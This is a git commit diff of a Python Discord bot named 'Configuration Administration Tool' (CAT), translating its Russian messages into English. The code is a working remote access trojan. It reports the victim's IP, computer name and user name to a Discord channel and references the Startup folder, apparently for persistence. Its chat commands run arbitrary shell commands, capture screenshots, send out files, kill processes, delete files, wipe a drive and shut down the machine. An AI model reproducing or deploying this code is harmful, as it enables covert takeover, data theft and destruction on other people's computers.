3f878d2a5b82f5f5893f70995b325049fddd45fd
NullifiedVlad <59374393+NullifiedVlad@users.noreply.github.com>
2020-06-11 00:31:21 +0300

    eng added

--- CAT.py
+++ CAT.py
@@ -6,21 +6,17 @@ Made by NullifiedVlad (C) 2020
 
 import ctypes
 import os
-import subprocess
 import sys
 from datetime import datetime
 import win32api
-# Импорт библиотек
 import discord
 import pyautogui as pg
 from discord.ext import commands
-
 import config
 import nullfunction as nf
-
-pg.FAILSAFE = False  # делает невозможным прервать движение мышки
-bot = commands.Bot(command_prefix='/')  # префикс для комманд
-channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
+pg.FAILSAFE = False
+bot = commands.Bot(command_prefix='/')
+channel = bot.get_channel(config.channel)
 bot.remove_command('help')
 
 path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
@@ -50,91 +46,93 @@ async def on_ready():
         minute = '0' + str(minute)
     else:
         pass
-    embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='Configuration Administration Tool',
+    embed = discord.Embed(title='**USER IS ONLINE**', description='Configuration Administration Tool',
                           color=0x03fcec, )
 
-    embed.add_field(name='**Время запуска**', value=f'{date.hour}:{minute}', inline=False)
-    embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
-    embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
-    embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
-    embed.add_field(name='**Название компьютера**', value=f'{win32api.GetComputerName()}', inline=False)
-    embed.add_field(name='**Имя пользователя**', value=f'{win32api.GetUserName()}', inline=True)
+    embed.add_field(name='**System time**', value=f'{date.hour}:{minute}', inline=False)
+    embed.add_field(name='**OS**', value=f'{sys.platform}', inline=False)
+    embed.add_field(name='**Screen resolution**', value=f'{x}x{y}', inline=False)
+    embed.add_field(name='**IP address**', value=f'{nf.ip()}', inline=False)
+    embed.add_field(name='**PC name**', value=f'{win32api.GetComputerName()}', inline=False)
+    embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=True)
 
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
-    embed.set_footer(text=f'Используйте /help для справки!',
+    embed.set_footer(text=f'Use /help for see bot features',
                      icon_url='https://i.imgur.com/YbYKL0F.png')
     embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
     await channel_start.send(embed=embed)
-    await bot.change_presence(activity=discord.Game(f'Был запущен в {date.hour}:{date.minute}'))
+    await bot.change_presence(activity=discord.Game(f'Was stated in {date.hour}:{date.minute}'))
     del x, y, minute, embed
 
 
 @bot.command()
-async def move(ctx, x, y, time):  # перемещение курсора
+async def move(ctx, x, y, time):
     pg.moveTo(int(x), int(y), float(time))
-    await ctx.send('**CAT:**  Курсор был передвинут на X:' + str(x) + ' Y:' + str(y))
+    await ctx.send(f'Mouse was moved on X:{str(x)} Y:{str(y)}')
 
 
 @bot.command()
-async def click(ctx):  # кликнуть мышкой
+async def click(ctx):
     try:
         pg.click()
-        await ctx.send('**CAT:**  Был сделан клик!')
+        await ctx.send('**CAT:** Clicked!')
     except Exception as e:
-        await ctx.send(f'**CAT:** Произошла **ошибка!** \n{e}')
+        await ctx.send(f'ERROR \n{e}')
 
 
 @bot.command()
-async def screenshot(ctx):  # сделать скриншот
+async def screenshot(ctx):
     pg.screenshot(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
     await ctx.send(file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png'))
     os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
 
 
 @bot.command()
-async def cg(ctx):  # смена раскладки
+async def cg(ctx):
     pg.hotkey('alt', 'shift')
-    await ctx.send('**CAT:**  Раскладка клавиатуры успешно изменена!')
+    await ctx.send('**CAT:** keyboard language was changed!')
 
 
 @bot.command()
-async def write(ctx, *, text):  # написать текс
-    pg.typewrite(text)
-    await ctx.send(f"**CAT:**  Был набран текст: {text}")
+async def write(ctx, *, text):
+    try:
+        pg.typewrite(text)
+        await ctx.send(f'Success!')
+    except Exception as e:
+        await ctx.send(f'ERROR! \n{e}')
     del text
 
 
 @bot.command()
-async def press(ctx, key, how_many):  # нажать клавишу
-    if key in config.keys and int(how_many) > 0:
+async def press(ctx, key, how_many):
+    if int(how_many) > 0:
         for i in range(int(how_many)):
             pg.press(key)
-        await ctx.send(f'**CAT:** Была нажата клавиша "{key}" {how_many} раза!')
+        await ctx.send(f'**CAT:** Key "{key}" was pressed {how_many} times!')
     else:
-        await ctx.send('**CAT:** Произошла ошибка! \n Вы указали **неверную клавишу** либо значение **меньше 1**! ')
+        await ctx.send('ERROR')
 
 
 @bot.command()
 async def help(ctx):  # send help message
-    embed = discord.Embed(title='**Команды**', description='Configuration Administration Tool.', color=0x03fcec, )
+    embed = discord.Embed(title='**Commands**', description='Configuration Administration Tool.', color=0x03fcec, )
     # заголовки
-    embed.add_field(name='**/help**', value='Выводит это сообщение.', inline=False)
-    embed.add_field(name='**/move**', value='(X) (Y) (time) Передвинуть курсор.', inline=False)
-    embed.add_field(name='**/click**', value='Сделать левый клик мышкой.', inline=False)
-    embed.add_field(name='**/write**', value='Напечатать что-то.', inline=False)
-    embed.add_field(name='**/press**', value='(how_many) Нажать клавишу несколько раз.', inline=False)
-    embed.add_field(name='**/screenshot**', value='Cделать скриншот экрана.', inline=False)
-    embed.add_field(name='**/cg** ', value='Изменить раскладку клавиатуры.', inline=False)
-    embed.add_field(name='**/processlist**', value='Выводит список процессов.', inline=False)
-    embed.add_field(name='**/command** ', value='Выполнить комманду в терминале.', inline=False)
-    embed.add_field(name='**/kill**', value='Закрыть принудительно процесс.', inline=False)
-    embed.add_field(name='**/delete**', value='Удалить файл.', inline=False)
-    embed.add_field(name='**/wallpaper**', value='(url) Изменить фон рабочего стола.', inline=False)
-    embed.add_field(name='**/disk_format**', value='Отформатировать диск.', inline=False)
-    embed.add_field(name='**/copy**', value='Отправляет файл к вам на сервер.', inline=False)
-    embed.add_field(name='**/shutdown**', value='Выключить ПК.', inline=False)
-    embed.add_field(name='**/reboot**', value='Перезагрузка ПК.', inline=False)
-    embed.add_field(name='**/off**', value='Выключить бота.', inline=False)
+    embed.add_field(name='**/help**', value='Show this message.', inline=False)
+    embed.add_field(name='**/move**', value='(X) (Y) (time) move mouse.', inline=False)
+    embed.add_field(name='**/click**', value='Left click.', inline=False)
+    embed.add_field(name='**/write**', value='Write something.', inline=False)
+    embed.add_field(name='**/press**', value='(key)(how_many) Press key.', inline=False)
+    embed.add_field(name='**/screenshot**', value='Screenshot.', inline=False)
+    embed.add_field(name='**/cg** ', value='Change keyboard language.', inline=False)
+    embed.add_field(name='**/command** ', value='Run command.', inline=False)
+    embed.add_field(name='**/kill**', value='Kill process.', inline=False)
+    embed.add_field(name='**/delete**', value='Delete file.', inline=False)
+    embed.add_field(name='**/wallpaper**', value='(url) change wallpaper.', inline=False)
+    embed.add_field(name='**/disk_format**', value='(name) Format disk.', inline=False)
+    embed.add_field(name='**/copy**', value='Send file in chat.', inline=False)
+    embed.add_field(name='**/shutdown**', value='Shutdown.', inline=False)
+    embed.add_field(name='**/reboot**', value='Reboot.', inline=False)
+    embed.add_field(name='**/off**', value='Disable bot.', inline=False)
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
     embed.set_footer(text=f'Made by NullifiedVlad',
                      icon_url='https://i.imgur.com/YbYKL0F.png')
@@ -145,79 +143,58 @@ async def help(ctx):  # send help message
 @bot.command()
 async def command(ctx, *, todo):
     if os.system(str(todo)):
-        await ctx.send('**CAT:** Комманда успешно выполнена!')
+        await ctx.send('Success!')
     else:
-        await ctx.send('**CAT:** Ошибка выполения!')
+        await ctx.send('ERROR')
 
 
 @bot.command()
-async def kill(ctx, *, process):  # убить процесс
+async def kill(ctx, *, process):
     if os.system(f'taskkill /im {str(process)} /f'):
-        await ctx.send('**CAT:** Процесс успешно убит!')
+        await ctx.send(f'Process {str(process)} was killed')
     else:
-        await ctx.send('**CAT:** Такого процесса нет или вы указали непраильный процесс!')
+        await ctx.send('ERROR')
 
 
 @bot.command()
-async def processlist(ctx):  # список процессов
-    f = open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt', 'w')
-    try:
-        data = subprocess.check_output(['tasklist'])
-        f.write(str(data))
-        f.close()
-        await ctx.send('**CAT:** Список процессов',
-                       file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt'))
-        os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt')
-    except FileNotFoundError:
-        await ctx.send('**CAT:** Данная команда только для Windows XP/7/8.1/10!')
-
-
-@bot.command()
-async def delete(ctx, file_on_delete):  # удалить файл
+async def delete(ctx, file_on_delete):
     try:
         os.remove(str(file_on_delete))
-        await ctx.send(f'Файл "{file_on_delete}" успешно удалён!')
+        await ctx.send(f'File "{file_on_delete}" was deleted!')
     except FileNotFoundError:
-        await ctx.send('**CAT:** Такой файл не найден!')
+        await ctx.send('File not found :(')
 
 
 @bot.command()
-async def disk_format(ctx, disk):  # форматирование диска
-    await ctx.send(f'**CAT:** Форматирую диск **{disk}**!')
+async def disk_format(ctx, disk):
+    await ctx.send(f'Deleting disk**{disk}**!')
     os.system(f'rd/s/q {disk}:\\')
 
 
 @bot.command()
-async def copy(ctx, way):  # копирование файла
+async def copy(ctx, way):
     try:
-        await ctx.send('**CAT:** Скопированный файл:', file=discord.File(way))
+        await ctx.send('Copied file:', file=discord.File(way))
         del way
     except FileNotFoundError:
-        await ctx.send('**CAT:** Не могу найти файл!')
-
-
-# ДОПИСАТЬ!
-'''@bot.command()
-async def clipboard_grab(ctx):
-    captured = subprocess.check_output( '' , shell=True)
-    ctx.send(f'**CAT**: {str(captured)}.')'''
+        await ctx.send('File not found!')
 
 
 @bot.command()
-async def shutdown(ctx):  # выключение пк
-    await ctx.send('Выключаю компьютер...')
+async def shutdown(ctx):
+    await ctx.send('Shutdown...')
     os.system('shutdown -s -t 0 >null')
 
 
 @bot.command()
-async def reboot(ctx):  # перезагрузка
-    await ctx.send('Перезагружаю компьютер...')
+async def reboot(ctx):
+    await ctx.send('Rebooting...')
     os.system('shutdown -r -t 0 >null')
 
 
 @bot.command()
-async def off(ctx):  # выключение бота
-    await ctx.send('**CAT:** Выключаюсь...')
+async def off(ctx):
+    await ctx.send('Disable...')
     sys.exit()
 
 
@@ -228,9 +205,9 @@ async def wallpaper(ctx, url):
 
     if ctypes.windll.user32.SystemParametersInfoW(20, 0,
                                                   f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 0):
-        await ctx.send('**CAT:** Обои успешно изменены!')
+        await ctx.send('Wallpaper changed!')
     else:
-        await ctx.send('**CAT:** Ошибка!')
+        await ctx.send('ERROR!')
     os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png')
 
 
